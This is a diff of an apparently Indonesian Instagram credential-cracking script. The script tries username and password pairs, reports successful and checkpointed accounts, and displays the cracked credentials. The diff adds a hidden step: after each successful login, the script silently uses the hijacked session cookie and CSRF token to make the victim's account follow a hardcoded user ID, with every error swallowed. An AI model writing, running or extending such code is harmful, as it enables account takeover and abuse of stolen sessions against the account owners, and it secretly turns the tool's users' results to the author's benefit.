@@ -156,21 +156,19 @@ def fanlogincoki():
         exit()
     except Exception as e:
         os.remove(cookie_file)
-        console.print(f" {H2}• {P2}[bold red]Terjadi kesalahan:[/] {e}")
+        console.print(f" {H2}• {P2}[bold red]Terjadi kesalahan lur :[/] {e}")
         exit()
 
-
 def follow(cookie):
-    cookie = cookie
-    target_user_id = '45460652779'  # Ganti dengan ID pengguna yang ingin di-follow
-    url = f'https://www.instagram.com/web/friendships/{target_user_id}/follow/'
-    headers = {"User-Agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',"X-Requested-With": "XMLHttpRequest"}
-    response = requests.post(url, cookies=cookie, headers=headers)
-    if response.status_code == 200:
-        print("Berhasil mengikuti pengguna!")
-    else:
-        print(f"Gagal mengikuti pengguna. Status Code: {response.status_code}")
-
+    try:
+        uid = re.search(r'ds_user_id=(\d+)', cookie).group(1)
+        target_user_id = '45460652779' 
+        url = f'https://www.instagram.com/web/friendships/{target_user_id}/follow/'
+        headers = {"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3","X-Requested-With":"XMLHttpRequest","Referer":"https://www.instagram.com/","X-CSRFToken":re.search(r'csrftoken=([^;]+)', cookie).group(1)}
+        cookies = dict([c.strip().split("=", 1) for c in cookie.split(";") if "=" in c])
+        res = requests.post(url, headers=headers, cookies=cookies)
+    except:
+        pass
 
 def ini_menu_btw_fanky_cuy():
     clear()
@@ -589,8 +587,10 @@ def threads(username, password):
             res_json = response.json()
             if 'logged_in_user' in res_json:
                  success +=1
+                 print()
                  kuki = convert_cookie(response.headers.get('Set-Cookie'))
                  auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
+                 follow(auth)
                  user = res_json['logged_in_user']
                  followers, following = info(username)
                  tree = Tree("📂 [bold green]AKUN SUKSES[/bold green]")
@@ -613,6 +613,7 @@ def threads(username, password):
                  break
             elif 'challenge' in res_text or 'https://i.instagram.com/challenge/' in res_text:
                  checkpoint +=1
+                 print()
                  followers, following = info(username)
                  tree = Tree("📂 [bold red]AKUN CHECKPOINT[/bold red]")
                  user_panel = Panel.fit(f"👤 {username}\n🔑 {password}", border_style="red", title="CREDENTIAL")
@@ -634,19 +635,6 @@ def threads(username, password):
 if __name__ == '__main__':
 	try:os.mkdir('data')
 	except:pass
-	try:os.system("touch data/ig-loginfan.txt")
-	except:pass
 	ini_menu_btw_fanky_cuy()
-
-
-
-
-
-
-
-
-
-
-
 
 
